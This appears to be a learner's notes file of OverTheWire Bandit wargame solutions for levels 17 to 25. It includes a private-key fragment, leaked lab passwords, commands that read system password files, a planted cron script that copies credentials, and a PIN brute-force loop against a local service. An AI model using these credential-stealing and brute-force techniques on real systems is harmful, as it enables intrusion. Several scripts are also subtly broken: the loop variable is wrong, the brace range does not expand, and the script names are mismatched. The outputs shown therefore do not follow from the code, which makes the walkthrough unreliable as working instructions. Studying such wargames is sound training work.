+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+# Copy ssh private key, dump it to file and then
+chmod 700 sshkey.priv
+ssh bandit17@bandit.labs.overthewire.org -p 2220 -i sshkey
+
+bandit17@bandit:~$ diff passwords.old passwords.new
+42c42
+< hlbSBPAWJmL6WFDb06gpTx1pPButblOA
+---
+> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+ssh  -t bandit18@bandit.labs.overthewire.org -p 2220 -i sshkey /bin/sh
+$ cat readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+bandit20 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+bandit22@bandit:/tmp$ export myname=bandit23
+bandit22@bandit:/tmp$ echo $myname
+bandit23
+bandit22@bandit:/tmp$ export mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+bandit22@bandit:/tmp$ echo $export
+
+bandit22@bandit:/tmp$ echo $mytarget
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/tmp$ ls -lh /tmp/8ca319486bfbbc3663ea0fbe81326349
+-rwxrwxrwx 1 bandit23 root 33 Jul 17 14:46 /tmp/8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:/tmp$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+bandit23@bandit:/var/spool/bandit24$ cat /tmp/my_script.sh
+#!/bin/bash
+cp  /etc/bandit_pass/bandit24 /tmp/my_pass2.txt
+cat /tmp/my_pass2.txt | wall
+chmod 777 /tmp/my_pass2.txt
+bandit23@bandit:/var/spool/bandit24$ cp /tmp/my_script.sh /var/spool/bandit24 ; chmod 777 /var/spool/bandit24/my_script.sh
+bandit23@bandit:/var/spool/bandit24$ cat /tmp/my_pass2.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+bandit24@bandit:~$ echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ |nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Fail! You did not supply enough data. Try again.
+
+bandit24@bandit:~$ for i in {0..10000}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %i $'\cc' |nc localhost 30002 $i; done
+Correct!
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+
+bandit24@bandit:/tmp$ cat 25.sh
+#!bin/bash
+
+export passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+for a in {0-1000}
+do
+echo $passwd' '$a | nc localhost 30002 >> result &
+done
+
+sort result |uniq -u
+
+bandit24@bandit:/tmp$ ./my_25.sh
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+
+bandit25: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
